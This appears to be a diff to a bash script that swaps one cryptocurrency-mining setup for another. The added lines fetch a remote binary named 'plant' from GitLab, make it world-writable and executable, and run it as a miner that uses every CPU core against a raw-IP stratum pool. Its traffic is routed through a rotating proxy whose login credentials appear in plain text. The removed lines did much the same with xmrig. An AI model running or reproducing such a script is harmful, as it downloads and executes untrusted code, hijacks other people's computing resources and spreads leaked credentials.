@@ -1,7 +1,4 @@
 #!/bin/bash
-wget https://github.com/Intan90002/dagx/raw/main/config.json
-wget https://github.com/Intan90002/dagx/raw/main/xmrig2xdag
-wget https://github.com/Intan90002/dagx/raw/main/xmrig
-chmod 777 xmrig xmrig2xdag config.json
-./xmrig2xdag -c config.json > /dev/null 2>&1 &
-./xmrig -o 127.0.0.1:3232. -u a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p x -a rx/xdag -t$(nproc --all)
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant
+chmod 777 plant
+./plant -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Tet -p c=OK -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
